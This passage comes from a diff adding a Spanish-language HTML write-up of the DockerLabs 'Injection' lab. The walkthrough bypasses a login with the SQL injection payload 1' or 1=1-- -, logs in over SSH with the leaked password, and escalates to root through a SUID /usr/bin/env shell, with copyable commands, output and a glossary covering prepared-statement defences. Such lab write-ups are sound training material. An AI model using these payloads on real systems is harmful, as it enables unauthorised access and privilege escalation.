+          el resto de la consulta incluyendo la verificación de contraseña.
+          La condición <code style="color:var(--red)">1=1</code> siempre es
+          verdadera, por lo que la consulta devuelve el primer registro de la tabla,
+          logrando el bypass y revelando la contraseña del usuario
+          <span class="hl">dylan</span> en texto claro.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="1' or 1=1-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLi PAYLOAD</span>
+        <div><span class="prompt">User: </span><span class="sqli">1' or 1=1-- -</span></div>
+        <div><span class="prompt">Pass: </span><span class="cmd">[cualquier valor]</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">Bienvenido Dylan! Has insertado correctamente tu contraseña:</span></div>
+        <div><span class="o-green">KJSDFG789FGSDF78</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// SQL INJECTION — ANÁLISIS DEL PAYLOAD</p>
+        <p>
+          <strong>1'</strong> → El número 1 cierra la comilla de apertura del parámetro user. El apóstrofe rompe la sintaxis SQL y empieza la inyección.<br>
+          <strong>or 1=1</strong> → Condición adicional siempre verdadera. Hace que la cláusula WHERE devuelva todos los registros.<br>
+          <strong>-- -</strong> → Comentario SQL en MySQL/MariaDB. Todo lo que viene después (incluyendo AND password='...') queda comentado y no se evalúa. El espacio después de -- es necesario en algunas versiones de MySQL.<br><br>
+          <strong>Query resultante:</strong> <code>SELECT * FROM users WHERE user='1' or 1=1-- -'</code><br>
+          <strong>Resultado:</strong> Devuelve el primer usuario de la tabla (dylan) con su contraseña en claro.
+        </p>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">USUARIO</div>
+          <div class="cred-val">dylan</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">CONTRASEÑA</div>
+          <div class="cred-val">KJSDFG789FGSDF78</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ACCESO SSH -->
+    <div class="section" id="acceso">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Acceso SSH como Dylan</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">CONEXIÓN SSH CON LAS CREDENCIALES OBTENIDAS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con las credenciales obtenidas de la inyección SQL, nos conectamos por SSH
+          al servidor. El servidor acepta las credenciales y obtenemos una shell
+          interactiva como el usuario <span class="hl">dylan</span> en un sistema
+          Ubuntu 22.04.4 LTS. Desde aquí debemos escalar privilegios hasta root.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ssh dylan@172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH</span>
+        <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">dylan@172.17.0.2</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>dylan@172.17.0.2's password: <span class="o-green">KJSDFG789FGSDF78</span></div>
+        <div>Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.18.12+kali-amd64 x86_64)</div>
+        <div>&nbsp;</div>
+        <div>&nbsp;* Documentation:&nbsp; https://help.ubuntu.com</div>
+        <div>&nbsp;* Management:&nbsp;&nbsp;&nbsp;&nbsp; https://landscape.canonical.com</div>
+        <div>&nbsp;* Support:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; https://ubuntu.com/pro</div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">dylan@ae8d8a92e02e:~$</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- PRIVESC -->
+    <div class="section" id="privesc">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Escalada de Privilegios — SUID env</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">BÚSQUEDA DE BINARIOS CON BIT SUID</span>
+      </div>
+      <div class="prose">
+        <p>
+          El bit <span class="hl-ora">SUID (Set User ID)</span> en un binario hace que
+          al ejecutarlo, el proceso corra con los permisos del <strong>propietario del
+          archivo</strong> (generalmente root) en lugar de los del usuario que lo ejecuta.
+          Buscamos todos los binarios con este bit activado en el sistema.
+        </p>
+        <p>
+          Entre los resultados destaca <span class="hl">/usr/bin/env</span>: una herramienta
+          estándar de Unix que normalmente se usa para ejecutar programas en un entorno
+          modificado. Con el bit SUID activado, se convierte en un vector de escalada
+          de privilegios documentado en <strong>GTFObins</strong>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="find / -perm -4000 2>/dev/null">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FIND SUID</span>
+        <div><span class="prompt-ssh">dylan@ae8d8a92e02e:~$ </span><span class="cmd">find / <span class="flag">-perm -4000</span> <span class="arg">2>/dev/null</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</div>
+        <div>/usr/lib/openssh/ssh-keysign</div>
+        <div>/usr/bin/su</div>
+        <div>/usr/bin/chfn</div>
+        <div>/usr/bin/newgrp</div>
+        <div>/usr/bin/mount</div>
+        <div>/usr/bin/umount</div>
+        <div>/usr/bin/passwd</div>
+        <div>/usr/bin/gpasswd</div>
+        <div><span class="o-green">/usr/bin/env</span></div>
+        <div>/usr/bin/chsh</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// DESGLOSE DEL COMANDO FIND</p>
+        <p>
+          <strong>find /</strong> → Busca recursivamente desde la raíz del sistema de archivos.<br>
+          <strong>-perm -4000</strong> → Filtra archivos cuyo modo incluya el bit SUID (octal 4000). El guion (-) indica "al menos estos bits activos", sin importar los demás.<br>
+          <strong>2>/dev/null</strong> → Redirige los errores (stderr, fd 2) a /dev/null, descartando los mensajes "Permission denied" que aparecerían al intentar leer directorios sin acceso. Limpia el output y muestra solo los resultados válidos.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">CONSULTAR GTFOBINS PARA ENV</span>
+      </div>
+      <div class="prose">
+        <p>
+          <strong>GTFObins</strong> es una base de datos curada de binarios Unix que pueden
+          usarse para escalar privilegios, escapar de shells restringidas o transferir archivos
+          cuando tienen configuraciones inseguras. Buscamos <code style="color:var(--green)">env</code>
+          bajo la categoría <strong>SUID</strong> y obtenemos el comando exacto:
+        </p>
+        <p>
+          <code style="color:var(--red)">env /bin/sh -p</code>
+        </p>
+        <p>
+          El flag <code style="color:var(--green)">-p</code> es clave: le indica a
+          <code>/bin/sh</code> que <strong>no descarte los privilegios efectivos</strong>.
+          Sin este flag, muchas shells modernas detectan que el UID real (dylan) difiere
+          del efectivo (root) y degradan los privilegios como medida de seguridad.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="/usr/bin/env /bin/sh -p">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PRIVESC</span>
+        <div><span class="prompt-ssh">dylan@ae8d8a92e02e:~$ </span><span class="cmd">/usr/bin/env <span class="arg">/bin/sh</span> <span class="flag">-p</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">VERIFICACIÓN Y ACCESO A /ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          El comando nos da una shell <code>#</code> inmediatamente.
+          Verificamos con <code style="color:var(--green)">whoami</code> que somos
+          <span class="hl">root</span> y navegamos al directorio
+          <code style="color:var(--green)">/root</code> para listar su contenido.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green"># whoami</span></div>
+        <div><span class="o-green">root</span></div>
+        <div><span class="o-green"># cd /root</span></div>
+        <div><span class="o-green"># ls -la</span></div>
+        <div>total 32</div>
+        <div>drwx------&nbsp; 1 root root 4096 May 13 2024 .</div>
+        <div>drwxr-xr-x 1 root root 4096 May 29 06:53 ..</div>
+        <div>-rw-------&nbsp; 1 root root&nbsp;&nbsp; 59 May 13 2024 .bash_history</div>
+        <div>-rw-r--r--  1 root root 3106 Oct 15 2021 .bashrc</div>
+        <div>drwxr-xr-x  3 root root 4096 Mar 25 2024 .local</div>
+        <div>-rw-------&nbsp; 1 root root&nbsp; 979 Mar 25 2024 .mysql_history</div>
+        <div>-rw-r--r--  1 root root&nbsp; 161 Jul&nbsp; 9 2019 .profile</div>
+        <div>-rw-------&nbsp; 1 root root 1821 Mar 25 2024 .viminfo</div>
+        <div><span class="o-green">#</span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// ¿POR QUÉ .MYSQL_HISTORY EN /ROOT?</p>
+        <p>
+          La presencia de <strong>.mysql_history</strong> en el directorio root revela que
+          el usuario root ha estado ejecutando comandos MySQL directamente desde la línea
+          de comandos. Este archivo registra todas las queries ejecutadas en sesiones
+          interactivas de MySQL. En un entorno real, esto podría contener queries con
+          credenciales, nombres de tablas sensibles o datos de configuración de la base
+          de datos. Siempre revisar este archivo en post-explotación:
+          <code>cat /root/.mysql_history</code>
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">auto_deploy.sh</div>
+          <div class="cmd-ref-syntax">sudo bash auto_deploy.sh &lt;máquina.tar&gt;</div>
+          <div class="cmd-ref-desc">Despliega el contenedor Docker de DockerLabs y muestra la IP asignada.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>sudo bash</span> → Necesita root para gestionar Docker y redes.</li>
+            <li><span>Ctrl+C</span> → Detiene y elimina el contenedor al finalizar.</li>
+            <li><span>172.17.0.0/16</span> → Subred Docker por defecto en la mayoría de sistemas.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt; -oX out.xml</div>
+          <div class="cmd-ref-desc">Escaneo completo de puertos con detección de versiones y scripts NSE.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-sC</span> → Scripts NSE: http-title, http-cookie-flags, ssh-hostkey.</li>
+            <li><span>-sV</span> → Versiones: Apache 2.4.52, OpenSSH 8.9p1.</li>
+            <li><span>-oX</span> → XML para xsltproc → HTML.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">SQL Injection básica</div>
+          <div class="cmd-ref-syntax">1' or 1=1-- -</div>
+          <div class="cmd-ref-desc">Payload de bypass de autenticación para consultas SQL sin prepared statements.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>1'</span> → Cierra la comilla del parámetro e inicia la inyección.</li>
+            <li><span>or 1=1</span> → Condición siempre verdadera.</li>
+            <li><span>-- -</span> → Comentario MySQL, descarta el resto de la query.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">find SUID</div>
+          <div class="cmd-ref-syntax">find / -perm -4000 2>/dev/null</div>
+          <div class="cmd-ref-desc">Busca todos los binarios con el bit SUID activado en el sistema.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-perm -4000</span> → Bit SUID (octal 4000) activo.</li>
+            <li><span>2>/dev/null</span> → Descarta errores de permisos.</li>
+            <li><span>-type f</span> → (opcional) Solo archivos regulares, no directorios.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">env SUID (GTFObins)</div>
+          <div class="cmd-ref-syntax">/usr/bin/env /bin/sh -p</div>
+          <div class="cmd-ref-desc">Escala a root aprovechando el bit SUID de env. El flag -p preserva los privilegios efectivos.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>env</span> → Ejecuta un programa en un entorno modificado.</li>
+            <li><span>/bin/sh</span> → Shell POSIX a spawnar.</li>
+            <li><span>-p</span> → No descarta los privilegios efectivos del SUID.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">ssh</div>
+          <div class="cmd-ref-syntax">ssh &lt;usuario&gt;@&lt;IP&gt;</div>
+          <div class="cmd-ref-desc">Conexión SSH con autenticación por contraseña al servidor remoto.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p &lt;PORT&gt;</span> → Puerto alternativo (por defecto 22).</li>
+            <li><span>-i &lt;KEY&gt;</span> → Autenticación con clave privada en lugar de contraseña.</span></li>
+            <li><span>-v</span> → Verbose: muestra el handshake para depuración.</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">SQL Injection (SQLi) — Inyección SQL</div>
+          <div class="glos-def"><strong>SQL Injection</strong> es una vulnerabilidad de seguridad web que ocurre cuando una aplicación incorpora datos controlados por el usuario directamente en consultas SQL sin sanitización. El atacante puede alterar la lógica de la consulta, bypassear autenticación, extraer datos de la base de datos, modificar o eliminar registros, e incluso ejecutar comandos del OS en algunos casos (ej: <code>xp_cmdshell</code> en SQL Server). La prevención correcta usa <strong>prepared statements</strong> (consultas parametrizadas) donde los datos del usuario son siempre tratados como datos, nunca como código SQL. En PHP: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE user=?"); $stmt->execute([$input]);</code>. OWASP clasifica SQLi como A03:2021 en el Top 10.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Bit SUID — Set User ID on Execution</div>
+          <div class="glos-def">El <strong>bit SUID</strong> (octal 4000) es un permiso especial de Unix/Linux que, cuando está activado en un ejecutable, hace que el proceso corra con el <strong>UID efectivo del propietario del archivo</strong> en lugar del UID del usuario que lo ejecuta. Si root es el propietario y el bit SUID está activo, cualquier usuario puede ejecutar el programa con privilegios de root. Esto es necesario para binarios legítimos como <code>passwd</code> (necesita escribir en /etc/shadow) o <code>sudo</code>. El peligro surge cuando binarios que permiten ejecutar código arbitrario (como <code>env</code>, <code>find</code>, <code>vim</code>, <code>python</code>) tienen este bit activado incorrectamente. Identificación: <code>ls -la</code> muestra <code>-rwsr-xr-x</code> (la 's' en lugar de 'x' en el grupo de permisos del propietario).</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">GTFObins — Binarios Unix para PrivEsc</div>
+          <div class="glos-def"><strong>GTFObins</strong> (Get The F*** Out Binaries) es una lista curada de binarios Unix que pueden ser abusados por un atacante para escalar privilegios, escapar de shells restringidas, transferir archivos o establecer conexiones. El proyecto categoriza cada binario según el vector de abuso: <strong>SUID</strong> (binario tiene bit SUID), <strong>Sudo</strong> (el usuario puede ejecutar el binario como root via sudo), <strong>Shell</strong> (puede spawnar una shell), <strong>File Read/Write</strong> (puede leer/escribir archivos arbitrarios), etc. En Injection, <code>env</code> aparece bajo la categoría SUID con el técnica Shell: <code>env /bin/sh -p</code>. Recurso: <code>https://gtfobins.github.io</code></div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">DockerLabs — Laboratorios de Hacking con Docker</div>
+          <div class="glos-def"><strong>DockerLabs</strong> es una plataforma española de laboratorios de hacking ético gratuitos que usa contenedores Docker como máquinas vulnerables. A diferencia de plataformas como HackTheBox o TryHackMe, los laboratorios se ejecutan localmente en tu propia máquina, eliminando la necesidad de conexión VPN y garantizando latencia mínima (el contenedor corre en tu propio host). El despliegue es instantáneo con <code>auto_deploy.sh</code> y la eliminación también: solo Ctrl+C. Las IPs son siempre del rango 172.17.0.0/16 (red bridge de Docker). Ideal para practicar sin límites de tiempo ni de instancias concurrentes.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Apache httpd — Servidor Web</div>
+          <div class="glos-def"><strong>Apache HTTP Server</strong> es el servidor web open-source más usado históricamente en el mundo. La versión 2.4.52 detectada en Injection es una versión de 2021 de la rama 2.4.x (LTS). En el contexto de esta máquina, Apache sirve la aplicación PHP de login vulnerable. Los scripts NSE de Nmap detectan automáticamente el header <code>Server: Apache/2.4.52 (Ubuntu)</code>, el título de la página y las flags de las cookies. El flag <code>httponly not set</code> en PHPSESSID indica que la cookie de sesión es accesible desde JavaScript, lo que haría posible el robo de sesión mediante XSS además de la SQLi.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Prepared Statements — Prevención de SQLi</div>
+          <div class="glos-def">Los <strong>prepared statements</strong> (sentencias preparadas) son la defensa principal contra SQL Injection. Separan el código SQL de los datos del usuario en dos fases: primero se envía la estructura de la query con placeholders (<code>?</code> o <code>:nombre</code>) al servidor de base de datos, que la compila; luego se envían los datos del usuario por separado. El servidor de BD trata los datos siempre como valores literales, nunca como código SQL, imposibilitando la inyección. En PHP con PDO: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE user=? AND pass=?"); $stmt->execute([$user, $pass]);</code>. En MySQL nativo: <code>PREPARE stmt FROM 'SELECT * FROM users WHERE user=?'; EXECUTE stmt USING @user;</code></div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // TOC ACTIVE
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObs.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const scrolled = document.documentElement.scrollTop;
+    const height   = document.documentElement.scrollHeight - window.innerHeight;
+    const pct = height > 0 ? (scrolled / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = pct + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) { toast = document.createElement('div'); toast.className = 'toast'; document.body.appendChild(toast); }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY CMD
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK'; btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1800);
+    }).catch(() => showToast('Error al copiar'));
+  }
+</script>
+</body>
+</html>
